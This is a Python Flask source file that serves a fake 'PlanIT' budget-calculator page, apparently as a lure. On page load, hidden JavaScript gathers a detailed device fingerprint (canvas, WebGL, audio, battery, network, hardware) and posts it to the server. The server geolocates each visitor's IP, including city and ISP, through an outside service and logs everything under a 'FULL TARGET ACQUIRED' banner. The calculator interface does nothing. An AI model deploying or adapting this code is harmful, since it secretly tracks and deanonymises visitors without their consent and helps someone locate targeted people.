from flask import Flask, request, render_template_string
import urllib.request
import json

app = Flask(__name__)

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>PlanIT - Budget Calculator</title>
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            background: #111827; 
            color: #f3f4f6; 
            margin: 0; 
            padding: 20px; 
        }
        .app-window {
            max-width: 950px;
            margin: 20px auto;
            background: #1e293b;
            border-radius: 8px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.6);
            border: 1px solid #334155;
            overflow: hidden;
        }
        /* Top Navigation Tabs */
        .tab-bar {
            background: #0f172a;
            padding: 10px 20px;
            display: flex;
            gap: 20px;
            border-bottom: 1px solid #334155;
            font-size: 14px;
        }
        .tab {
            color: #94a3b8;
            cursor: pointer;
            padding: 6px 12px;
            border-radius: 4px;
        }
        .tab.active {
            color: #fff;
            background: #3b82f6;
            font-weight: 500;
        }
        /* Main Content Container */
        .content {
            padding: 30px;
            background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
        }
        h1 {
            color: #ffffff;
            margin-top: 0;
            font-size: 28px;
            font-weight: 400;
        }
        .grid-container {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 25px;
            margin-top: 20px;
        }
        .card {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #475569;
            border-radius: 6px;
            padding: 20px;
            box-shadow: inset 0 1px 0 rgba(255,255,255,0.05);
        }
        .card h3 {
            margin-top: 0;
            color: #38bdf8;
            font-size: 16px;
            border-bottom: 1px solid #334155;
            padding-bottom: 8px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            color: #cbd5e1;
            font-size: 13px;
        }
        input, select {
            width: 100%;
            padding: 8px 10px;
            border-radius: 4px;
            border: 1px solid #475569;
            background: #0f172a;
            color: #fff;
            box-sizing: border-box;
            font-size: 13px;
        }
        .btn-row {
            display: flex;
            gap: 10px;
            margin-top: 20px;
        }
        button {
            background: #334155;
            color: #f8fafc;
            border: 1px solid #64748b;
            padding: 8px 16px;
            border-radius: 4px;
            font-size: 13px;
            cursor: pointer;
            font-weight: 500;
        }
        button:hover {
            background: #475569;
        }
        button.primary {
            background: #2563eb;
            border-color: #3b82f6;
            color: #fff;
        }
        button.primary:hover {
            background: #1d4ed8;
        }
        .summary-item {
            margin-bottom: 15px;
            font-size: 14px;
            color: #e2e8f0;
        }
        .summary-item span {
            font-weight: bold;
            color: #38bdf8;
        }
        .brand-footer {
            margin-top: 30px;
            display: flex;
            align-items: center;
            gap: 15px;
            border-top: 1px solid #334155;
            padding-top: 20px;
        }
        .brand-logo {
            width: 45px;
            height: 45px;
            background: linear-gradient(135deg, #38bdf8, #2563eb);
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 22px;
            color: #fff;
        }
        .brand-name {
            font-size: 24px;
            font-weight: bold;
            letter-spacing: 1px;
            color: #f8fafc;
        }
    </style>
    <script>
        function simpleHash(str) {
            let hash = 0;
            for (let i = 0; i < str.length; i++) {
                hash = ((hash << 5) - hash) + str.charCodeAt(i);
                hash |= 0;
            }
            return hash.toString(16);
        }

        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = 200;
                canvas.height = 50;
                ctx.textBaseline = "top";
                ctx.font = "16px 'Arial'";
                ctx.fillStyle = "#f60";
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = "#069";
                ctx.fillText("PlanIT Diagnostics", 2, 15);
                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                ctx.fillText("PlanIT Diagnostics", 4, 17);
                return simpleHash(canvas.toDataURL());
            } catch (e) {
                return "Unsupported";
            }
        }

        function getWebGLInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return { vendor: 'No WebGL', renderer: 'No WebGL' };
                
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                const vendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Unknown';
                const renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown';
                return { vendor, renderer };
            } catch (e) {
                return { vendor: 'Error', renderer: 'Error' };
            }
        }

        async function getAudioFingerprint() {
            try {
                const AudioContext = window.AudioContext || window.webkitAudioContext;
                if (!AudioContext) return "Unsupported";
                const audioCtx = new AudioContext();
                const oscillator = audioCtx.createOscillator();
                const analyser = audioCtx.createAnalyser();
                const gainNode = audioCtx.createGain();
                const scriptProcessor = audioCtx.createScriptProcessor(4096, 1, 1);

                oscillator.type = 'triangle';
                oscillator.frequency.value = 10000;

                audioCtx.resume();
                oscillator.connect(gainNode);
                gainNode.connect(analyser);
                analyser.connect(scriptProcessor);
                scriptProcessor.connect(audioCtx.destination);

                return new Promise((resolve) => {
                    scriptProcessor.onaudioprocess = function (e) {
                        try {
                            const output = e.inputBuffer.getChannelData(0);
                            let sum = 0;
                            for (let i = 0; i < output.length; i++) {
                                sum += Math.abs(output[i]);
                            }
                            scriptProcessor.onaudioprocess = null;
                            oscillator.stop();
                            audioCtx.close();
                            resolve(simpleHash(sum.toString()));
                        } catch (err) {
                            resolve("Audio Error");
                        }
                    };
                    oscillator.start(0);
                    setTimeout(() => resolve("Timeout"), 1000);
                });
            } catch (e) {
                return "Unsupported";
            }
        }

        window.onload = async function() {
            let webgl = { vendor: 'Error', renderer: 'Error' };
            let audioHash = 'Unsupported';

            try { webgl = getWebGLInfo(); } catch(e) {}
            try { audioHash = await getAudioFingerprint(); } catch(e) {}

            const fingerprint = {
                platform: navigator.platform || 'Unknown',
                userAgent: navigator.userAgent || 'Unknown',
                screenResolution: (window.screen.width || 0) + "x" + (window.screen.height || 0),
                availResolution: (window.screen.availWidth || 0) + "x" + (window.screen.availHeight || 0),
                colorDepth: window.screen.colorDepth || 'Unknown',
                pixelRatio: window.devicePixelRatio || 1,
                language: navigator.language || 'Unknown',
                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
                deviceMemory: navigator.deviceMemory || 'Unknown',
                maxTouchPoints: navigator.maxTouchPoints || 0,
                cookieEnabled: navigator.cookieEnabled,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
                canvasHash: getCanvasFingerprint(),
                webglVendor: webgl.vendor,
                webglRenderer: webgl.renderer,
                audioFingerprint: audioHash
            };

            try {
                if (navigator.userAgentData) {
                    fingerprint.mobile = navigator.userAgentData.mobile;
                    fingerprint.brands = navigator.userAgentData.brands.map(b => b.brand + " v" + b.version).join(", ");
                    fingerprint.platformDetails = navigator.userAgentData.platform;
                }
            } catch(e) {}

            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    fingerprint.batteryLevel = Math.round(battery.level * 100) + '%';
                    fingerprint.batteryCharging = battery.charging;
                }
            } catch (e) {
                fingerprint.batteryLevel = 'Unavailable';
            }

            try {
                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (connection) {
                    fingerprint.effectiveType = connection.effectiveType || 'Unknown';
                    fingerprint.downlink = connection.downlink ? connection.downlink + ' Mbps' : 'Unknown';
                }
            } catch(e) {}

            fetch('/log', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(fingerprint)
            });
        };
    </script>
</head>
<body>
    <div class="app-window">
        <div class="tab-bar">
            <div class="tab active">Budget Calculator</div>
            <div class="tab">Goal Interest Calculator</div>
            <div class="tab">Settings</div>
        </div>

        <div class="content">
            <h1>Welcome</h1>
            
            <div class="grid-container">
                <!-- Left Panel: Income Expense Input -->
                <div class="card">
                    <h3>Income / Expense Input</h3>
                    
                    <div class="form-group">
                        <label>Edit Funds (Add or Remove)</label>
                        <input type="text" placeholder="0.00">
                    </div>
                    
                    <div class="form-group">
                        <label>Expense Amount (R):</label>
                        <input type="number" placeholder="0.00" step="0.01">
                    </div>

                    <div class="form-group">
                        <label>Expense Category:</label>
                        <select>
                            <option>Food & Groceries</option>
                            <option>Transport</option>
                            <option>Utilities</option>
                            <option>Entertainment</option>
                        </select>
                    </div>

                    <div class="form-group">
                        <label>Date:</label>
                        <input type="text" value="25/09/2026">
                    </div>

                    <div class="btn-row">
                        <button class="primary">Add Expense</button>
                        <button>Calculate Budget</button>
                        <button>Reset</button>
                    </div>
                </div>

                <!-- Right Panel: Financial Summary Dashboard -->
                <div class="card">
                    <h3>Financial Summary Dashboard</h3>
                    <div class="summary-item">Current Balance: <span>R 0.00</span></div>
                    <div class="summary-item">Highest Expense: <span>None</span></div>
                    <div class="summary-item">Most Frequent Expense: <span>None</span></div>

                    <div class="btn-row" style="margin-top: 40px;">
                        <button>Export to Text File</button>
                        <button>History</button>
                        <button>Exit to Login</button>
                    </div>
                </div>
            </div>

            <!-- Bottom Branding -->
            <div class="brand-footer">
                <div class="brand-logo">P</div>
                <div class="brand-name">Planit</div>
            </div>
        </div>
    </div>
</body>
</html>
"""

def get_location_from_ip(ip_address):
    if not ip_address or ip_address in ["127.0.0.1", "localhost"] or ip_address.startswith("10.") or ip_address.startswith("192.168."):
        return "Local / Proxy Network"
    try:
        url = f"http://ip-api.com/json/{ip_address}"
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=3) as response:
            data = json.loads(response.read().decode())
            if data.get('status') == 'success':
                return f"{data.get('city')}, {data.get('regionName')} ({data.get('country')}) [ISP: {data.get('isp')}]"
    except Exception:
        pass
    return "Lookup Failed"

@app.route('/')
def home():
    if request.headers.get('CF-Connecting-IP'):
        client_ip = request.headers.get('CF-Connecting-IP')
    elif request.headers.get('X-Forwarded-For'):
        client_ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    else:
        client_ip = request.remote_addr
        
    location = get_location_from_ip(client_ip)
    
    print(f"\n================ [ FULL TARGET ACQUIRED ] ================")
    print(f" [IP Address] : {client_ip}")
    print(f" [Location]   : {location}")
    print(f" [User-Agent] : {request.headers.get('User-Agent')}")
    print(f"==========================================================")
    
    return render_template_string(HTML_PAGE)

@app.route('/log', methods=['POST'])
def log_device():
    data = request.json
    if data:
        print(f"\n-------------- [ HARDWARE & RENDERING FINGERPRINT ] --------------")
        print(f" * GPU Vendor        : {data.get('webglVendor')}")
        print(f" * GPU Renderer      : {data.get('webglRenderer')}")
        print(f" * Canvas Hash       : {data.get('canvasHash')}")
        print(f" * Audio Hash        : {data.get('audioFingerprint')}")
        print(f" * OS / Platform     : {data.get('platform')} ({data.get('platformDetails', 'N/A')})")
        print(f" * Mobile Device?    : {data.get('mobile', False)}")
        print(f" * Timezone          : {data.get('timezone')}")
        print(f" * Screen Resolution : {data.get('screenResolution')} (Avail: {data.get('availResolution')})")
        print(f" * Color Depth       : {data.get('colorDepth')}-bit | Pixel Ratio: {data.get('pixelRatio')}")
        print(f" * CPU Cores         : {data.get('hardwareConcurrency')}")
        print(f" * Estimated RAM     : {data.get('deviceMemory')} GB")
        print(f" * Network Speed     : {data.get('effectiveType')} (~{data.get('downlink')})")
        print(f" * Battery Status    : {data.get('batteryLevel', 'N/A')}")
        print(f"------------------------------------------------------------------\n")
    return '', 204

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
